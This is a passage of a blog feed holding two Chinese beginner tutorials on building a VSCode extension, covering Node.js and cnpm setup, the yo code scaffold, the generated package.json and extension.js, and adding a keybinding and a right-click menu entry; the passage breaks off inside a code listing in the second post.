    <category term="ICS" scheme="https://amiriox.github.io/tags/ICS/"/>
    
  </entry>
  
  <entry>
    <title>VSCODE 扩展开发 01</title>
    <link href="https://amiriox.github.io/2020/11/20/VSCODE_EXTENSION_1/"/>
    <id>https://amiriox.github.io/2020/11/20/VSCODE_EXTENSION_1/</id>
    <published>2020-11-19T16:00:00.000Z</published>
    <updated>2025-02-13T16:17:08.078Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> <em>撰写日期</em> 绝对有问题</p></blockquote><blockquote><p>此文章的部分图片可能无法加载。这是因为大概这一版的博客搭建在云服务器上所以图片没有用图床<br /><del>为什么呢？难道云服务器流量不要钱吗？白嫖图床不好吗？</del></p></blockquote><p>开新坑了,<code>VSCode: 扩展开发攻略</code>系列主要介绍如何从零开始(<strong>不需要Js/TS基础</strong>)开发一个VSCode插件</p><h1 id="序-写在前面的废话">序: 写在前面的废话</h1><p>由于<del>英语不好</del>谷歌翻译后的<ahref="https://code.visualstudio.com/api">官方文档</a>很迷惑,我就打算自己简单翻翻看 翻一下 顺便加上一些注解</p><p>需要注意的一点是 有些东西你别理解 先能复现再说因为有些Js语法你没学肯定看不懂</p><p>放心,这个系列一定会咕咕咕的,<del>估计十年都写不好</del></p><p>开始吧! (等帖子多了我会专门搞出来一个帖子收集起来)</p><h1 id="概览">概览</h1><p>我们先了解下vscode插件开发的流程.VSCode是Chromium内核,Electron+TypeScript编写的,<del>底层有些可以瞎改的CSS</del><strong>VSCode插件开发并不难,熟悉API之后很简单</strong>vscode插件开发时,重要的就是两个文件<code>package.json</code>和<code>extension.js</code>文件一个用来描述有什么,一个用来告诉干什么 &gt; 注:虽然我还是比较喜欢TypeScript,但这里我们还是使用Js演示<del>毕竟TS还不火</del></p><h1 id="环境-工欲善其事必先利其器">环境: 工欲善其事,必先利其器</h1><h2 id="node.js-使用npm并换源cnpm">Node.Js : 使用npm并换源(cnpm)</h2><p>首先你需要一个node.js,下好了node.js才能使用<code>npm</code>命令进入<ahref="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a>下载npm(推荐LTS版)然后你可以换源(换源的目的是为了提升部署速度,<del>我知道你node.js下载了快半小时了</del>)打开cmd,输入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure> 这样,就可以换淘宝的镜像源了<del>淘宝真是啥都有</del>然后下面的操作,就可以直接使用<code>cnpm</code>而不是<code>npm</code>了(速度明显提升)</p><h2 id="官方vscode插件生成环境">官方VSCode插件生成环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g yo generator-code</span><br></pre></td></tr></table></figure><blockquote><p>注意,不要把<code>cnpm</code>打成<code>cnpm</code> ! ! !别笑,真就有人(比如我)犯了这样的低级错误</p></blockquote><p>然后新建一个目录,在cmd中使用<code>cd+新建的目录路径</code>进入这个目录这个目录将会是你的插件的工作区 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line">cd D:\VSCode_Ext\AirxWorld\</span><br></pre></td></tr></table></figure> 然后执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yo code</span><br></pre></td></tr></table></figure>下面的操作类似这样 中间有些耗时较长的地方我暂停了下GIF,不影响实际操作<imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/YlTHgI.gif"alt="YlTHgI.gif" /> 然后 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd name</span><br><span class="line">code .</span><br></pre></td></tr></table></figure>(这里的name就是你<code>? What's the identifier of your extension? name</code>这里输入的名字)然后cmd就可以关掉了,你发现你惊喜的进入了VSCode <imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/Yl7K2R.png"alt="Yl7K2R.png" /> (背景图片来自WLOP) (忽略我打开的那个json文件)</p><h1 id="开始征程-第一个helloworld插件">开始征程:第一个HelloWorld插件</h1><p>##熟悉文件</p><p>左侧文件资源管理器已经能看到<code>package.json</code>和<code>extension.js</code>这两个文件了,qwq这两个文件就是官方那个轮子生成的文件 我们先熟悉一下这个package.json文件<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span>             <span class="comment">//插件名</span></span><br><span class="line"><span class="attr">&quot;displayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span>      <span class="comment">//显示名</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;描述 可以中文&quot;</span><span class="punctuation">,</span>  <span class="comment">//描述 对应你在命令行cmd输入的描述</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1&quot;</span><span class="punctuation">,</span>         <span class="comment">//版本号  注: 以上在vscode插件市场可见</span></span><br><span class="line"><span class="attr">&quot;engines&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;vscode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.45.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;Other&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="comment">//扩展被激活时的事件(也就是干的事 有基础的同学可以理解为一个函数)</span></span><br><span class="line"><span class="attr">&quot;activationEvents&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;onCommand:name.helloWorld&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="comment">//入口文件</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./extension.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="comment">//插件差不多所有的东西到要在这改,主要是一些命令的描述</span></span><br><span class="line"><span class="attr">&quot;contributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;lint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint .&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pretest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm run lint&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node ./test/runTest.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@types/vscode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.45.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;@types/glob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;@types/mocha&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;@types/node&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^13.11.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;eslint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.8.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;glob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.6&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;mocha&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.2&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.8.3&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;vscode-test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.3.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure> 没注释的地方可以忽略掉</p><p>然后我们再熟悉下<code>extension.js</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// The module &#x27;vscode&#x27; contains the VS Code extensibility API</span><br><span class="line">// Import the module and reference it with the alias vscode in your code below</span><br><span class="line">const vscode = require(&#x27;vscode&#x27;);</span><br><span class="line"></span><br><span class="line">// this method is called when your extension is activated</span><br><span class="line">// your extension is activated the very first time the command is executed</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @param &#123;vscode.ExtensionContext&#125; context</span><br><span class="line"> */</span><br><span class="line">//插件被激活时执行这个</span><br><span class="line">function activate(context) &#123;</span><br><span class="line"></span><br><span class="line">// Use the console to output diagnostic information (console.log) and errors (console.error)</span><br><span class="line">// This line of code will only be executed once when your extension is activated</span><br><span class="line">console.log(&#x27;Congratulations, your extension &quot;name&quot; is now active!&#x27;);</span><br><span class="line"></span><br><span class="line">// The command has been defined in the package.json file</span><br><span class="line">// Now provide the implementation of the command with  registerCommand</span><br><span class="line">// The commandId parameter must match the command field in package.json</span><br><span class="line">let disposable = vscode.commands.registerCommand(&#x27;name.helloWorld&#x27;, function () &#123;</span><br><span class="line">// The code you place here will be executed every time your command is executed</span><br><span class="line"></span><br><span class="line">// Display a message box to the user</span><br><span class="line">vscode.window.showInformationMessage(&#x27;Hello World from name!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">context.subscriptions.push(disposable);</span><br><span class="line">&#125;</span><br><span class="line">exports.activate = activate;</span><br><span class="line"></span><br><span class="line">// this method is called when your extension is deactivated</span><br><span class="line">//被释放时激活这个(上面那句英文也是这个意思,是自己生成的不关我事 ( ( (</span><br><span class="line">function deactivate() &#123;&#125;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">activate,</span><br><span class="line">deactivate</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure> ## 文件分析这两个自己生成的文件已经带有了输出helloworld提示信息的功能,我们来分析下他是如何实现的<code>package.json</code>节选: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;contributes&quot;: &#123;</span><br><span class="line">&quot;commands&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;command&quot;: &quot;name.helloWorld&quot;,</span><br><span class="line">&quot;title&quot;: &quot;Hello World&quot;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>commands的意思是”命令”,也就是说,以后要执行的命令都要在这<strong>注册</strong>(即进行描述)了解json格式的同学也能发现commands<strong>其实是一个json数组</strong>,包含很多个json对象,不理解没关系其中内部”command”是命令的名字,name.helloworld也就是这个命令的名字,可以理解为身份证,比如以后要用到这个命令就要用这个名字叫他 &gt; 一个人呼喊另一个人: 张三!&gt; 人群中一堆叫张三的走了过来: 咋啦? &gt; 于是他喊:身份证号是888888888888888888的人过来一下! &gt; 于是他要的张三就来了</p><p>这里的888888888888888888就可以理解为name.helloworld &gt;注意,这里name不是固定的,而是我们这个项目的名称</p><p>title的意思是标题,顾名思义,也就是标题然后我们看看<code>extension.js</code>节选 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">activate</span>(<span class="params">context</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> disposable = vscode.<span class="property">commands</span>.<span class="title function_">registerCommand</span>(<span class="string">&#x27;name.helloWorld&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">vscode.<span class="property">window</span>.<span class="title function_">showInformationMessage</span>(<span class="string">&#x27;Hello World from name!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">context.<span class="property">subscriptions</span>.<span class="title function_">push</span>(disposable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>function中文意思函数 可以理解为一长串清单 告诉某个对象要做什么我们看代码里有这么一句context.subscriptions.push(disposable); &gt;context n. 环境；上下文；来龙去脉</p><p>前面不看 不要理解 直接从push开始 &gt; push vt.推动，增加；对…施加压力，逼迫；按；说服; vi. 推进；增加；努力争取;n. 推，决心</p><p>你可以形象一点理解: 把一个函数”扔”进一个地方 由别人去执行它 就好像&gt;你找了一张纸,写了一些任务,“给我端茶,倒水”,然后把这张纸”扔”到你家机器人的脑子里&gt; 然后你机器人帮你干活去了,依据是这张纸</p><p><code>let disposable</code>什么意思呢?let”让,你可以理解为让”disposable”(一个名字)这个东西出现(实际上是声明了一个变量)后面<code>=</code>是赋值的意思,是把一个东西的值给另一个东西,比如,<code>a=3</code>就是把3值给a既然是赋值,那为什么后面没有数字却有一串英文呢?实际上可以这样理解,你有一个神奇的箱子,你往里放进去一个面团,他就会吐出一个面包<del>不就是面包机</del>你可以把函数理解为这个神奇的箱子,参数理解为面团(你放进去的东西),<strong>返回值</strong>理解为面包(吐出来的东西)&gt; 当然,有的函数不会”吐东西”,甚至也不接收东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vscode.commands.registerCommand(&#x27;name.helloWorld&#x27;, function () &#123;</span><br><span class="line">vscode.window.showInformationMessage(&#x27;Hello World from name!&#x27;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这段代码就是执行一个函数,函数名字(面包机的型号)<code>registerCommand</code>,参数是’name.helloWorld’这个字符串和另一个函数(Js中字符串不是<code>"</code>而是<code>'</code>)参数是什么?就是上面说的你放进面包机的东西返回结果是<code>Disposable对象</code>,至于对象,你暂时理解成你对象好了,你对象是一个人这个类的个体<del>如果你没有对象的话,赶紧去找啊,还学什么学啊(大雾</del> &gt; 小提示:实际上,`vscode.commands.registerCommand()就是一个API(ApplicationProgrammingInterface,应用程序接口,也就是那个面包机的入口,用于注册命令,不理解没关系</p><p>有时候,您可能看到这样的写法 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.subscriptions.push(vscode.commands.registerCommand(&#x27;name.helloWorld&#x27;, () =&gt; &#123;</span><br><span class="line">    //......</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>实际上这里它直接把值”扔”了进去,而没有用”纸”记下来 第二,它使用了() =&gt;{…}这样的写法,实际上叫一个<code>Lambda</code>表达式,暂时忽略即可感兴趣可以自行百度/Bing/Google</p><p>而函数内部呢,也是一个API,这个API<code>vscode.window.showInformationMessage()</code>用于输出一句调试信息也很好理解,vscode就是vscode,window是窗口,show informationmessage也就是显示 信息 消息 而括号中的’Hello World fromname!’就是一个字符串,表示你要输出的信息,可以自己改</p><p>这样就分析完了,如何测试一下是否可以呢?按<code>f5</code>,在你键盘的第一行,不算esc键的第五个按键可以看到它弹出来了一个新窗口 按下Ctrl+Shift+P,也就是打开VSCode的命令面板<imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/YlOvV0.png"alt="YlOvV0.png" /> (注意看上图上方)输入hello,就能看到我们的helloworld命令了(title就是Hello World)回车选择这个命令 <imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/YlXFM9.png"alt="YlXFM9.png" />(那个登录成功是我装的另一个插件<code>vscode-luogu</code>显示的,与本插件无关)就能看到我们的输出信息了,即vscode.window.showInformationMessage()括号里的字符串(参数)</p><p>这样,第一个Hello World就说完了,是不是很容易? 剩下的 以后再说吧不会咕的 至少我也会把右键菜单命令和快捷键说完吧 掰掰~ 下期再见 ~</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; &lt;em&gt;撰写日期&lt;/em&gt; 绝对有问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;此文章的部分图片可能无法加载。这是因为大概这一版的博客搭建在云服务器上所以图片没有用图床&lt;br&gt;
&lt;del&gt;为什么呢？难道云服务器流量不要钱吗？白嫖图床不好吗？&lt;/del&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;开新坑了,&lt;code&gt;VSCode: 扩展开发攻略&lt;/code&gt;系列主要介绍如何从零开始(&lt;strong&gt;不需要Js/TS基础&lt;/strong&gt;)开发一个VSCode插件&lt;/p&gt;
&lt;h1 id=&quot;序-写在前面的废话&quot;&gt;序: 写在前面的废话&lt;/h1&gt;
&lt;p&gt;由于&lt;del&gt;英语不好&lt;/del&gt;谷歌翻译后的&lt;a href=&quot;https://code.visualstudio.com/api&quot;&gt;官方文档&lt;/a&gt;
很迷惑,我就打算自己简单翻翻看 翻一下 顺便加上一些注解&lt;/p&gt;</summary>
    
    
    
    <category term="扩展开发" scheme="https://amiriox.github.io/categories/%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>VSCODE 扩展开发 02</title>
    <link href="https://amiriox.github.io/2020/11/20/VSCODE_EXTENSION_2/"/>
    <id>https://amiriox.github.io/2020/11/20/VSCODE_EXTENSION_2/</id>
    <published>2020-11-19T16:00:00.000Z</published>
    <updated>2025-02-13T16:17:26.940Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> <em>撰写日期</em> 绝对有问题</p></blockquote><blockquote><p>此文章的部分图片可能无法加载。这是因为大概这一版的博客搭建在云服务器上所以图片没有用图床<br /><del>为什么呢？难道云服务器流量不要钱吗？白嫖图床不好吗？</del></p></blockquote><h1 id="概要">概要</h1><p>主要借助右键菜单和快捷键讲解一下<code>package.json</code>.<del>没错我就是标题党</del></p><h1 id="添加右键菜单和快捷键">添加右键菜单和快捷键</h1><p>我们在<code>package.json</code>中找到<code>contributes</code>,然后可以看到 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;contributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;extension.sayHello&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">           <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>我们在<code>command</code>数组的后面加一个<code>,</code>(英文逗号)然后写如下代码 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;contributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;extension.sayHello&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">           <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">     <span class="comment">//这个keybindings数组就是快捷键绑定了</span></span><br><span class="line">    <span class="attr">&quot;keybindings&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span> <span class="comment">//要绑定的命令名字</span></span><br><span class="line">              <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+f10&quot;</span><span class="punctuation">,</span>    <span class="comment">//按下ctrl f10时执行name.helloworl命令</span></span><br><span class="line">              <span class="attr">&quot;mac&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cmd+f10&quot;</span><span class="punctuation">,</span>   <span class="comment">//mac下快捷键 (mac os x的ctrl键叫cmd键</span></span><br><span class="line">              <span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editorFocus&quot;</span>   <span class="comment">//什么时候,editor focus 即编辑器获得焦点 也就是光标在编辑器上</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//菜单</span></span><br><span class="line">    <span class="attr">&quot;menus&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="comment">//注意这里不是[而是&#123;了,表示不是数组而是对象</span></span><br><span class="line">          <span class="attr">&quot;editor/context&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">               <span class="punctuation">&#123;</span></span><br><span class="line">                   <span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editorFocus&quot;</span><span class="punctuation">,</span>                  <span class="comment">//同上</span></span><br><span class="line">                   <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span>        <span class="comment">//右键菜单命令</span></span><br><span class="line">                   <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;navigation&quot;</span>                   <span class="comment">//显示位置,&quot;navigation&quot;是最上面</span></span><br><span class="line">               <span class="punctuation">&#125;</span></span><br><span class="line">           <span class="punctuation">]</span></span><br><span class="line">     <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><strong>请手写一遍而不是复制粘贴,加深印象</strong>可以照着写,单词不用死记硬背,vscode有自动补全和提示. 另外标准json不支持注释,写的时候不要加上注释. <imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/Y1j5zF.png"alt="Y1j5zF.png" /> 这样我们就能看到右键菜单了,点击helloworld命令或ctrl+f10 <imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/Y1vpsH.png"alt="Y1vpsH.png" /> great.</p><h1 id="packag.json详细分析">packag.json详细分析</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 